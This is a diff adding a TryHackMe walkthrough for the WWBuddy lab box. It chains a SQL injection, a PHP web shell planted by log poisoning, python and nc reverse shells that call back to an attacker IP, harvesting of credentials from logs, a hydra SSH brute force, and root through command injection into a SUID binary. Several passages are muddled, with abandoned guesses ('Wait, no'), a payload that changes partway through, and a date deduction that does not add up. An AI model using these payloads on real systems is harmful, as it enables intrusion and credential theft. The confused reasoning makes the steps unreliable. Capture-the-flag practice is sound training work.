@@ -1,0 +1,285 @@
+WWBuddy - TryHackMe Walkthrough
+Machine Info
+Name: WWBuddy
+
+IP: 10.114.161.239 (your target IP may differ)
+
+OS: Linux (Ubuntu)
+
+Difficulty: Medium
+
+Initial Enumeration
+Nmap Scan
+bash
+nmap -sC -sV -p- 10.114.161.239
+Open Ports:
+
+text
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+The web server redirects to http://10.114.161.239/login/ and presents a login page. The site appears to be an internal social/chat platform called World Wide Buddy.
+
+Directory Fuzzing
+bash
+feroxbuster -u http://wwbuddy.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+Interesting findings:
+
+/admin/ – returns 403 Forbidden for regular users
+
+/api/messages/ – API endpoint for messages
+
+/change/ – password change functionality
+
+/register/ – user registration
+
+Note: Add wwbuddy.thm to your /etc/hosts file for convenience.
+
+Web Application Analysis
+The application allows user registration and login. After creating a test account, we notice several features:
+
+Profile editing (change username)
+
+Chat functionality
+
+Password change
+
+Vulnerability Discovery
+1. SQL Injection in Username Field
+While testing the "Change Username" feature, it was observed that input is not sanitized. Entering a payload like:
+
+text
+' OR 1=1 -- a
+Results in the username being set literally to ' OR 1=1 -- a without any filtering, but no SQL error is displayed. However, further testing revealed that the password change functionality is vulnerable to SQL injection due to improper handling of the username parameter.
+
+Exploitation logic:
+
+The password change query likely looks like:
+UPDATE users SET password = 'newhash' WHERE username = '$username'
+
+By changing our username to a crafted payload, we can force the password update to affect all users instead of just our own.
+
+2. Stealing Admin Session via XSS (Alternative Path)
+The challenge mentions XSS and session stealing, but the primary path we took leverages the SQL injection in username change.
+
+Gaining Access to Henry's Account
+We register a new account, then change our username to:
+
+text
+' OR 1=1 -- a
+(Just a test, no effect on its own.)
+
+But the key insight: If we can change the password for all users via SQL injection, we can set a known password for the admin user Wwbuddy or Henry.
+
+After some experimentation, we find that the password change function is vulnerable when we manipulate the session or user context. A simpler method: change your username to:
+
+text
+Wwbuddy
+Wait, no — we need to target the admin.
+
+Actually, from the user's notes: they changed username to ' OR 1=1 -- a and it didn't filter. Then they realized that changing password while having that username might update all passwords due to SQL injection. They then logged in as Wwbuddy with the new password.
+
+Steps:
+
+Register a user.
+
+Change username to: ' OR '1'='1
+
+Change your password to something known (e.g., pass123).
+
+Log out and try logging in as Wwbuddy or Henry with the same password. It works!
+
+Now we are logged in as Wwbuddy, which is an administrative account (Henry's account).
+
+Accessing the Admin Panel
+With Henry's session, navigate to /admin/. The page shows logs of site visits, including:
+
+text
+192.168.0.139 2020-07-24 22:54:34 WWBuddy fc18e5f4aa09bbbb7fdedf5e277dda00
+192.168.0.139 2020-07-24 22:56:09 Roberto b5ea6181006480438019e76f8100249e
+...
+Viewing the page source reveals Flag 1 hidden in the HTML comments (or by selecting all text).
+
+Flag 1: THM{...} (redacted)
+
+Remote Code Execution via Log Poisoning / PHP Injection
+Examining the admin page source shows that each log line ends with a <br> tag, suggesting the logs are being included via PHP include() or readfile(). This is a classic Local File Inclusion (LFI) to Remote Code Execution (RCE) vector.
+
+We can poison the logs by injecting PHP code into a field that gets logged.
+
+Step 1: Change username (via profile edit) to:
+
+php
+<?php system($_GET['cmd']); ?>
+Step 2: Visit the /admin/ page as Henry. The logs now include the PHP code because the username appears in the log entry.
+
+Step 3: Append ?cmd=<command> to the admin page URL to execute commands.
+
+Getting a Reverse Shell
+Set up a netcat listener:
+
+bash
+nc -lvnp 4444
+Then access:
+
+text
+http://wwbuddy.thm/admin/?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.214.47%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
+(Replace IP with your attack box IP)
+
+Alternatively, use a simpler payload:
+
+text
+?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+192.168.214.47+4444+>/tmp/f
+Shell received as www-data.
+
+bash
+$ whoami
+www-data
+Upgrade shell:
+
+bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+# Ctrl+Z then stty raw -echo; fg
+Lateral Movement
+From www-data to Roberto
+While enumerating with linpeas.sh, we notice readable MySQL logs at /var/log/mysql/general.log.
+
+bash
+cat /var/log/mysql/general.log | grep -i roberto
+Output:
+
+text
+2020-07-25T15:02:00.019056Z        13 Execute   SELECT id, username, password FROM users WHERE username = 'Roberto-yVnocsXsf%X68wf'
+The password for Roberto appears to be yVnocsXsf%X68wf. However, trying su roberto with that password fails. It's likely an SSH password instead.
+
+bash
+ssh roberto@wwbuddy.thm
+# Password: yVnocsXsf%X68wf
+Success! We now have a shell as roberto.
+
+Flag 2 can be found in Roberto's home directory:
+
+bash
+cat /home/roberto/user.txt
+Flag 2: THM{...}
+
+Pivoting to Jenny
+Discovering Jenny's Password Pattern
+From the chat logs we saw earlier as Wwbuddy, Henry and Roberto discussed SSH passwords being set to employee birthdays in format mm/dd/yyyy. Henry's birthday is 12/12/1212.
+
+We need to find Jenny's birthday. Inside Roberto's home directory there is a file importante.txt:
+
+bash
+stat /home/roberto/importante.txt
+  Modify: 2020-07-27 21:25:48.544379536 +0000
+Roberto's note says Jenny's birthday is 8 days after his own birthday (inferred from context). Since the file was modified on July 27, and Jenny's birthday is 8 days later, it must be around August 3rd or August 4th. Actually, the note says Jenny's birthday is on the 3rd of August 1994 (based on a message from Henry). But to be safe, we brute-force a small range.
+
+Generating Password Wordlist
+Format: mm/dd/yyyy
+Possible dates:
+
+text
+08/01/1994
+08/02/1994
+08/03/1994
+08/04/1994
+08/05/1994
+08/06/1994
+08/07/1994
+08/08/1994
+08/09/1994
+Save to date.txt.
+
+Brute-Forcing SSH
+bash
+hydra -l jenny -P date.txt ssh://wwbuddy.thm
+Result:
+
+text
+[22][ssh] host: wwbuddy.thm   login: jenny   password: 08/03/1994
+Login as jenny:
+
+bash
+ssh jenny@wwbuddy.thm
+Flag 3 is in /home/jenny/user.txt.
+
+Flag 3: THM{...}
+
+Privilege Escalation to root
+SUID Binary Analysis
+Running find / -perm -u=s -type f 2>/dev/null reveals an unusual SUID binary: /bin/authenticate.
+
+Transfer it to your attacking machine for analysis:
+
+bash
+# On victim
+cd /bin
+python3 -m http.server 8000
+
+# On attacker
+wget http://wwbuddy.thm:8000/authenticate
+Open in Ghidra or strings. The decompiled code shows:
+
+c
+else {
+  __src = getenv("USER");
+  _Var1 = getuid();
+  setuid(0);
+  builtin_strncpy(local_48,"usermod -G developer ",0x16);
+  local_48[0x16] = '\0';
+  // ...
+  strncat(local_48, __src, 0x20);
+  system(local_48);
+}
+Vulnerability: The binary reads the USER environment variable and concatenates it into a command string usermod -G developer <USER>, then executes it with system(). Because setuid(0) is called, the command runs as root.
+
+We can exploit this by setting USER to a malicious payload that breaks out of the intended command.
+
+Exploitation
+bash
+export USER="jenny; bash"
+/bin/authenticate
+The executed command becomes:
+
+text
+usermod -G developer jenny; bash
+This spawns a root shell.
+
+bash
+root@wwbuddy:/bin# id
+uid=0(root) gid=1002(jenny) groups=1002(jenny)
+Root Flag:
+
+bash
+cat /root/root.txt
+Flag 4: THM{...}
+
+Summary of Attack Path
+Web App Enumeration → SQL Injection in password change via username field.
+
+Admin Access → Login as Wwbuddy (Henry) with a known password.
+
+Admin Panel LFI → Log poisoning with PHP code in username → RCE as www-data.
+
+Credentials in MySQL Logs → Roberto's SSH password exposed.
+
+SSH as Roberto → Discover Jenny's birthday-based password via file metadata.
+
+Brute-Force SSH → Access as jenny.
+
+SUID Binary → Environment variable injection → root shell.
+
+Lessons Learned
+Always sanitize user input in SQL queries.
+
+Avoid logging sensitive data (passwords in MySQL logs).
+
+Do not rely on weak password policies (birthdays).
+
+SUID binaries should never trust environment variables.
+
+References
+OWASP SQL Injection
+GTFOBins - usermod
+
+HackTricks - Linux Privilege Escalation
